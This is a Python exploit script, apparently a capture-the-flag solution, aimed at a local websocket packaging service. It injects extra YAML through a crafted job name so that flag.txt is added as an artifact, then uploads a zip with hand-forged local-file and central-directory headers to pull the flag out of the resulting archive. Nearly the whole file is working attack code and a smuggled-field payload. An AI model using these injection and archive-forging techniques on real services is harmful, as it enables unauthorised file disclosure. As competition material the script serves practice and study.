import base64
import re
import urllib
from zipfile import ZipFile

from pwn import p32
from websocket import create_connection

ws = create_connection("ws://localhost:5555/ws/")


def cmd(cmd, do_rcv: bool = True):
    ws.send(cmd)
    if do_rcv:
        return ws.recv()
    else:
        return


def upload(name, data):
    data = base64.b64encode(data).decode()
    r = cmd(f"upload {name} {data}")
    l = r.strip().split(" ")
    assert l[0] == "upload-success", r


def download(name):
    r = cmd(f"download {name}")
    l = r.strip().split(" ")
    assert l[0] == "file", r

    return base64.b64decode(l[2])


def yaml_injection():
    name = '''manyflgs"
      artifacts:
        - "flag.txt"
        - "flag.txt" 
    - use: archive
      name: "'''

    cmd("job package " + urllib.parse.quote(name))


def upload_very_large_zip():
    with ZipFile("first.zip", mode="w") as zip_file:
        with zip_file.open("D" * 100, mode="w") as mem:
            mem.write(b"A")

        for i in range(3):
            with zip_file.open(str(i) * 11, mode="w") as mem:
                mem.write(b"B")

    with open("first.zip", "rb") as f:
        upload("manyflgs.tar.zip", f.read())


def upload_smaller_zip():
    filename_len = 141
    placeholder = b"{{" + b"A" * filename_len + b"}}"

    with ZipFile("second.zip", mode="w") as zip_file:
        with zip_file.open(placeholder.decode(), mode="w") as mem:
            mem.write(b"ABC")

    # local file header, most fields are irrelevant (set to zero)
    local_file_header = bytes([
        0x50, 0x4B, 0x03, 0x04,  # magic bytes
        0x00, 0x00,  # version
        0x00, 0x00,  # flags
        0x00, 0x00,  # compression
        0x00, 0x00,  # mod time
        0x00, 0x00,  # mod date
        0x00, 0x00, 0x00, 0x00,  # checksum
        0x00, 0x00, 0x00, 0x00,  # compressed size
        0x00, 0x00, 0x00, 0x00,  # uncompressed size
        0x00, 0x00,  # name length
        0x00, 0x00,  # extra field length
        0x00, 0x00,  # file name
    ])

    # central directory header, most fields are irrelevant (set to zero)
    central_directory_header = bytes([
        0x50, 0x4B, 0x01, 0x02,  # magic bytes
        0x00, 0x00,  # version
        0x00, 0x00,  # version needed
        0x00, 0x00,  # flags
        0x00, 0x00,  # compression
        0x00, 0x00,  # mod time
        0x00, 0x00,  # mod date
        0x00, 0x00, 0x00, 0x00,  # checksum
        0x00, 0x07, 0x00, 0x00,  # compressed size
        0x00, 0x07, 0x00, 0x00,  # uncompressed size
        0x02, 0x00,  # name length
        0x62, 0x00,  # extra field len
        0x00, 0x00,  # file comment len
        0x00, 0x00,  # disk number start
        0x00, 0x00,  # internal attributes
        0x00, 0x00, 0x00, 0x00,  # external attributes
        0x39, 0x01, 0x00, 0x00,  # offset of local header
    ])

    payload = local_file_header + central_directory_header
    padding_len = len(placeholder) - len(payload)

    # Replace placeholders
    with open("second.zip", "rb") as f:
        contents = f.read()

    # Replace in local file header and central directory header
    for result in re.finditer(b"{{.*?}}", contents):
        start, stop = result.span()
        assert len(payload) + padding_len == stop - start
        contents = contents[:start + padding_len] + payload + contents[stop:]

    upload("manyflgs.tar.zip", contents)


yaml_injection()
upload_very_large_zip()
upload_smaller_zip()

recv_zip = download("manyflgs.tar/PK")

print(b"flug" in recv_zip)
print(re.findall(br"flug\{.*?\}", recv_zip))
